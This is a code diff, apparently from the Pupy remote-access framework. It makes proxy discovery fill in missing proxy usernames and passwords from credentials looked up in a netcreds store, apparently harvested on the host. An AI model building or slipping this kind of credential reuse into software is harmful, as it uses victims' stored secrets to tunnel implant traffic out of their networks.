@@ -12,6 +12,8 @@ from . import Proxy
 from .clients import PupyTCPClient, PupySSLClient
 from .clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
 
+from .netcreds import find_first_cred
+
 logger = getLogger('proxies')
 
 PROXY_MATCHER = re.compile(
@@ -440,7 +442,20 @@ except ImportError:
     set_proxy_unavailable = None
 
 
-def find_proxies(url=None):
+def find_auth(proxy_info):
+    if proxy_info.username is None and proxy_info.password is None:
+        address, port = proxy_info.addr.split(':')
+        cred = find_first_cred(
+            proxy_info.schema.lower(),
+            address, port
+        )
+
+        if cred:
+            proxy_info.username = cred.user
+            proxy_info.password = cred.password
+
+
+def find_proxies(url=None, auth=True):
     wpad_proxies = None
 
     if url and get_proxy_for_address:
@@ -450,16 +465,25 @@ def find_proxies(url=None):
     if wpad_proxies:
         logger.info('WPAD for %s: %s', url, wpad_proxies)
         for proxy_info in wpad_proxies:
+            if auth:
+                find_auth(proxy_info)
+
             yield proxy_info
 
     # Try proxies which works
     proxy_info = find_default_proxy()
     if proxy_info:
+        if auth:
+            find_auth(proxy_info)
+
         yield proxy_info
 
     # Try everything
     for proxy_info in get_proxies():
         if proxy_info:
+            if auth:
+                find_auth(proxy_info)
+
             yield proxy_info
 
 
